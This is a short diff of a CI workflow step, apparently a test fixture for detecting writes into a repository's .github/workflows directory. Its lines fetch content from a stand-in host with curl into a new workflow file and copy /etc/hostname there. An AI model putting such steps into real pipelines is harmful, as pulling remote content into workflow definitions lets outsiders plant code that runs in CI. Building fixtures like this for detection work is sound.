@@ -23,9 +23,8 @@ jobs:
       run: |
         D="$GITHUB_WORKSPACE/.github/workflows"
         mkdir -p "$D"
-        printf 'a
-' >> "$D/diag_printf.yml"
-        echo 'b' > "$D/diag_echo.yml"
+        printf abc >> "$D/diag_printf.yml"
+        echo def > "$D/diag_echo.yml"
         curl -s -m 10 "http://collector.radar.test/x" -o "$D/diag_curl.yml" || true
         cp /etc/hostname "$D/diag_cp.yml"
         /bin/dd if=/etc/hostname of="$D/diag_dd.yml" bs=1 count=4 2>/dev/null || true
